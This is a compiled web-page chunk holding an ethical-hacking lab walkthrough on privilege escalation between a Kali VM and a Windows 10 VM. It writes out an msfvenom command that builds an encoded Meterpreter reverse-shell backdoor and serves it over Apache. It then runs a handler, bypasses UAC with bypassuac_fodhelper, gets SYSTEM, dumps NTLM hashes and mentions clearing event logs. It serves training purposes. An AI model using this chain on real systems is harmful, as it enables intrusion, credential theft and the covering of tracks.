import{_ as t,c as a,a1 as s,o as n}from"./chunks/framework.BDxlaA_J.js";const g=JSON.parse('{"title":"Escalating Privileges","description":"","frontmatter":{},"headers":[],"relativePath":"categories/ethical-hacking-labs/5-system-hacking/5-Escalating-Privileges.md","filePath":"categories/ethical-hacking-labs/5-system-hacking/5-Escalating-Privileges.md"}'),i={name:"categories/ethical-hacking-labs/5-system-hacking/5-Escalating-Privileges.md"};function o(r,e,p,c,l,d){return n(),a("div",null,e[0]||(e[0]=[s(`<h1 id="escalating-privileges" tabindex="-1">Escalating Privileges <a class="header-anchor" href="#escalating-privileges" aria-label="Permalink to &quot;Escalating Privileges&quot;">​</a></h1><p>Privilege Escalation is the demonstration of misusing a bug, configuration imperfection, or design oversight in a working framework or programming application to increase lifted access to assets that are regularly shielded from an application or client.</p><p>Once attackers gain access to the target system, they start looking for different ways to escalate their privilege in the system. They can exploit vulnerability, design flaw or configuration oversight in the OS or software applications on the target system to gain elevated access to resources that are normally protected from an application or user. The privilege escalation can be <strong>vertical</strong> or <strong>lateral</strong>.</p><h3 id="objectives" tabindex="-1">Objectives <a class="header-anchor" href="#objectives" aria-label="Permalink to &quot;Objectives&quot;">​</a></h3><ul><li>Demonstrate how to escalate privileges on a victim machine by exploiting its vulnerabilities.</li></ul><h3 id="requisites" tabindex="-1">Requisites <a class="header-anchor" href="#requisites" aria-label="Permalink to &quot;Requisites&quot;">​</a></h3><ul><li>Kali Linux virtual machine.</li><li>Windows 10 virtual machine.</li></ul><h2 id="create-a-backdoor" tabindex="-1">Create a Backdoor <a class="header-anchor" href="#create-a-backdoor" aria-label="Permalink to &quot;Create a Backdoor&quot;">​</a></h2><p>To create the malicious executable file, type this command and put your Kali IP address on <code>LHOST</code> option:</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b &quot;\\x00&quot; LHOST=10.0.2.42 -f exe &gt; Desktop/Exploit.exe</code></p><p>This command will create the Windows executable file named <strong>Exploit.exe</strong> and will be saved on the Kali <strong>desktop</strong>.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/62f3153c4c87084931d3ec529bde0add9c8bf888/exploitexe.png" alt="exploit.exe"></p><h2 id="share-the-exploit-exe-file" tabindex="-1">Share the Exploit.exe file <a class="header-anchor" href="#share-the-exploit-exe-file" aria-label="Permalink to &quot;Share the Exploit.exe file&quot;">​</a></h2><p><strong>First</strong> of, we need to setup the apache configuration and the shared folder.</p><h3 id="apache-configuration" tabindex="-1">Apache configuration <a class="header-anchor" href="#apache-configuration" aria-label="Permalink to &quot;Apache configuration&quot;">​</a></h3><p><em>If you didn&#39;t have apache2 installed, run <strong>apt-get install apache2</strong>.</em></p><p>Navigate to the apache2 folder, open the <strong>apache2.conf</strong> configuration file, and add a new line: <code>vim /etc/apache2/apache2.conf</code></p><p>Add a new line with the command: <code>servername localhost</code> and save the file.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/1523fa1d4fdbc682f9908f33a01fbc1e08ba283c/apacheconf.png" alt="apache.conf"></p><p>Create a new directory inside html folder: <code>mkdir /var/www/html/share/</code></p><p>Change the <a href="https://www.tutonics.com/2012/12/linux-file-permissions-chmod-umask.html" target="_blank" rel="noreferrer">mode</a> for the share to <strong>755</strong>: <code>chmod -R 755 /var/www/html/share/</code></p><p>Change the ownership of that folder to <strong>www-data</strong>: <code>chown -R www-data:www-data /var/www/html/share/</code></p><p><em>To see the configuration of sharing options type:</em><code>ls -la /var/www/html/ | grep share</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>drwxr-xr-x 2 www-data www-data  4096 Dec 18 20:52 share</span></span></code></pre></div><p>Now copy the malicious file to the shared location: <code>cp /root/Desktop/Test.exe /var/www/html/share/</code></p><p>Start the apache service to run the http server: <code>service apache2 start</code></p><h2 id="perform-exploitation" tabindex="-1">Perform Exploitation <a class="header-anchor" href="#perform-exploitation" aria-label="Permalink to &quot;Perform Exploitation&quot;">​</a></h2><p>Start the Metasploit Framework by typing:</p><p><code>msfconsole</code></p><p>Select the <strong>multi/handler</strong> and set the payload to <strong>meterpreter/reverse_tcp</strong>:</p><p><code>use exploit/multi/handler</code><code>set payload windows/meterpreter/reverse_tcp</code></p><p>Set the <strong>LHOST</strong> to the Kali IP address:</p><p><code>set LHOST 10.0.2.42</code></p><p>Start the exploit on background:</p><p><code>exploit -j -z</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>[*] Exploit running as background job 0.</span></span>
<span class="line"><span>[*] Exploit completed, but no session was created.</span></span>
<span class="line"><span>[*] Started reverse TCP handler on 10.0.2.42:4444</span></span></code></pre></div><h2 id="run-the-exploit" tabindex="-1">Run the Exploit <a class="header-anchor" href="#run-the-exploit" aria-label="Permalink to &quot;Run the Exploit&quot;">​</a></h2><p>Switch to the <strong>Windows 10</strong> machine, launch the <strong>browser</strong> and type the URL:</p><p><code>http://10.0.2.42/share/</code> <em>(Change to the IP address of your your Kali).</em></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/b65a2a5858140f439e8de89c919d452668346884/shareexploit.png" alt="share-exploit"></p><p>Click <strong>Exploit.exe</strong> to download the backdoor file. Once the file is downloaded navigate to the download location and open the file to execute.</p><p>If an <strong>Open File - Security Warning</strong> window appears, click <strong>Run</strong>.</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/87089f69512685222b66d10ab10832f0382538f9/securityWarningWin.png" alt="Sec Warning"></p><p>Switch back to the Kali machine. Meterpreter session has been successfully opened, as shown below:</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>[*] Sending stage (180291 bytes) to 10.0.2.15</span></span>
<span class="line"><span>[*] Meterpreter session 1 opened (10.0.2.42:4444 -&gt; 10.0.2.15:49804) at 2019-12-18 21:04:09 -0500</span></span></code></pre></div><p>To interact with the available sessions, you can use the command <code>sessions</code> or <code>sessions -i</code> to list the current sessions opened. <strong>To open any session, select the ID by issuing the command:</strong></p><p><code>sessions &lt;ID&gt;</code></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/2b57cd80a9fdbe2dfd1bf4ad18f9df32f894a256/sessions.png" alt="sessions"></p><h2 id="establish-a-session" tabindex="-1">Establish a Session <a class="header-anchor" href="#establish-a-session" aria-label="Permalink to &quot;Establish a Session&quot;">​</a></h2><p><a href="https://www.blueliv.com/downloads/Meterpreter_cheat_sheet_v0.1.pdf" target="_blank" rel="noreferrer">[+] Meterpreter Cheat Sheet</a></p><p>Open the current Meterpreter session and type:</p><p><code>getuid</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>meterpreter &gt; getuid</span></span>
<span class="line"><span>Server username: DESKTOP-ICB2IQ4\\dummy</span></span></code></pre></div><p>You will notice that the Meterpreter server is running with the normal user privileges. You will not be able to execute command (such as <code>hashdump</code>, which dumps the user account hashes located in the <strong>SAM</strong> file; <code>clearev</code>, which clears the event logs remotely; and so on.) that requires administrative/root privileges.</p><p>Let&#39;s check this out by executing this command:</p><p><code>run post/windows/gather/smart_hashdump</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>meterpreter &gt; run post/windows/gather/smart_hashdump</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[*] Running module against DESKTOP-ICB2IQ4</span></span>
<span class="line"><span>[*] Hashes will be saved to the database if one is connected.</span></span>
<span class="line"><span>[+] Hashes will be saved in loot in JtR password file format to:</span></span>
<span class="line"><span>[*] /root/.msf4/loot/20191218220106_default_10.0.2.15_windows.hashes_986306.txt</span></span>
<span class="line"><span>[-] Insufficient privileges to dump hashes!</span></span></code></pre></div><p><strong>[-] Insufficient privileges to dump hashes!</strong></p><p>The command fails to dump the hashes from the SAM file located in Windows 10 and returns an error stating that Insufficient Privileges to dump hashes.</p><p>From this, it is evident that Meterpreter server requires admin privileges to perform such actions.</p><p>Now, we can try to escalate the privileges by issuing a <code>getsystem</code> command that attempts to elevate the user privileges.</p><p><code>getsystem -t 1</code></p><p><em>which uses the Service - <a href="https://securityintelligence.com/identifying-named-pipe-impersonation-and-other-malicious-privilege-escalation-techniques/" target="_blank" rel="noreferrer">Named Pipe Impersonation</a> (In Memory/Admin) Technique.</em></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>meterpreter &gt; getsystem -t 1</span></span>
<span class="line"><span>[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:</span></span>
<span class="line"><span>[-] Named Pipe Impersonation (In Memory/Admin)</span></span></code></pre></div><p>The command fails to escalate privileges and returns an error <strong>(Access is Denied).</strong></p><p>From the above result, it is evident that the security configuration of the Windows 10 machine is blocking you from gaining unrestricted access to it.</p><h2 id="perform-privilege-escalation" tabindex="-1">Perform Privilege Escalation <a class="header-anchor" href="#perform-privilege-escalation" aria-label="Permalink to &quot;Perform Privilege Escalation&quot;">​</a></h2><p>We can try to bypass the user account control setting that is blocking you from gaining unrestricted access to machine.</p><p>Move the current Meterpreter session to the background. Just type <code>background</code>.</p><p>Use the <strong>bypassuac_fodhelper</strong> exploit for Windows: <code>use exploit/windows/local/bypassuac_fodhelper</code></p><p>Type <code>options</code> to see the configurations, and you will observer theres only session setting, type <code>sessions</code> to see the ID of the previous meterpreter session and set to the current exploit:</p><p><code>set SESSION &lt;ID&gt;</code></p><p>Type <code>run</code> to exploit:</p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/fd2d00d7a9d552981f6422e0ab4dd04a6fe6d9b5/bypassuac_fodhelper.png" alt="run-bypassuac_fodhelper"></p><p><strong>The BypassUAC exploit has successfully bypassed the UAC setting on the Windows 10 machine and another Meterpreter session has opened.</strong></p><p>Now, the first thing is check the current User ID status of Meterpreter by issuing <code>getuid</code> command. You will observe that Meterpreter server is still running with <strong>normal user privileges</strong>.</p><p><code>getuid</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>meterpreter &gt; getuid</span></span>
<span class="line"><span>Server username: DESKTOP-ICB2IQ4\\dummy</span></span></code></pre></div><p>At this stage, we shall re-issue the <code>getsystem</code> command with the <code>-t 1</code> switch, in an attempt to <strong>elevate the privileges</strong>.</p><p><code>getsystem -i 1</code></p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>meterpreter &gt; getsystem -i 1</span></span>
<span class="line"><span></span></span>
<span class="line"><span>...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).</span></span></code></pre></div><p><strong>This time, the command has successfully escalated user privileges and returns a message stating got system, as shown above.</strong></p><p>Now, type <code>getuid</code> again.</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>meterpreter &gt; getuid</span></span>
<span class="line"><span>Server username: NT AUTHORITY\\SYSTEM</span></span></code></pre></div><p>The meterpreter session is now running with <strong>SYSTEM</strong> privileges (<strong>NT AUTHORITY\\SYSTEM</strong>).</p><p>Let&#39;s try to obtain the <strong>hashes</strong> located in the <strong>SAM</strong> file of Windows 10 by typing:</p><p><code>run post/windows/gather/smart_hashdump</code></p><p><img src="https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/fd2d00d7a9d552981f6422e0ab4dd04a6fe6d9b5/hashdump.png" alt="getSystem"></p><p>This time, the meterpreter successfully extracted the NTLM hashes and displayed them as shown in above. Thus, we have successfully escalated privileges by exploiting the Windows 10 machine&#39;s vulnerabilities.</p><p><strong>You can now execute commands like (clearev, which clears the event logs remotely, etc)</strong></p>`,90)]))}const u=t(i,[["render",o]]);export{g as __pageData,u as default};
